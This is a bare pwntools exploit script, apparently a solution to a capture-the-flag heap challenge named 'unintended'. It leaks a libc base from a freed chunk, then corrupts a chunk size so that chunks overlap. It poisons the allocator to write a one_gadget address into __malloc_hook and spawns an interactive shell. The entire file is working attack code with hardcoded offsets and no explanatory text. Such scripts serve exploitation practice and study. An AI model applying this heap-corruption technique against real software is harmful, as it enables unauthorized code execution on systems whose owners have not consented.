from pwn import *
p=process('./unintended')
elf = ELF('./unintended')
libc = ELF('libc.so.6')

raw_input("DEBUG")

'''
b*0x555555555316
b*0x5555555554fa
b*0x55555555561b
b*0x555555555717
b*0x5555555557e2
'''


def add(idx,categ,name,length,descr,points):
  p.sendlineafter('> ', '1')
  p.sendlineafter('number: ', str(idx))
  p.sendlineafter('category: ', categ)
  p.sendlineafter('name: ', name)
  p.sendlineafter('length: ', str(length))
  p.sendafter('description: ', descr)
  p.sendlineafter('Points: ', str(points))
  print("ADD ",str(idx))

def patch(idx,descr):
  p.sendlineafter('> ', '2')
  p.sendlineafter('number: ', str(idx))
  p.sendafter('description: ', descr)
  print "patch ",str(idx)

def deploy(idx):
  p.sendlineafter('> ', '3')
  p.sendlineafter('number: ', str(idx))

def free(idx):
  p.sendlineafter('> ', '4')
  p.sendlineafter('number: ', str(idx))
  print("Free ",str(idx))


add(0,'web','b',0x500,"a",1000)
add(1,'web','b',0x38,"a",1000)
add(2,'web','c',0x38,"a",1000)
free(0)
free(1)
free(2)
add(0,'web','b',0x500,"\xa0",1000)
add(1,'web','b',0x38,"a",1000)

deploy(0)

p.recvuntil('Description: ')
libc_base = u64(p.recv(6)+"\x00"*2) - 0x3ebca0
print "libc_base: ",hex(libc_base)

one = libc_base + 0x10a41c
_malloc_hook = libc_base + libc.symbols['__malloc_hook']
print "One: ",hex(one)
print "__malloc_hook: ",hex(_malloc_hook)

add(3,'web','b',0x4f8,"a"*0x4f8,1000)
add(4,'web','c',0x4f8,"c"*0x4f8,1000)
add(5,'web','d',0x78,"b"*0x78,1000)

free(4)
patch(3,b"c"*0x4f8+p16(0x581))
free(5)
add(4,'web','b',0x578,"c"*0x540+p64(_malloc_hook),1000)
add(5,'web','d',0x78,"b"*0x78,1000)
add(6,'web','d',0x78,p64(one),1000)

p.sendline("1")
p.sendline("7")
p.interactive()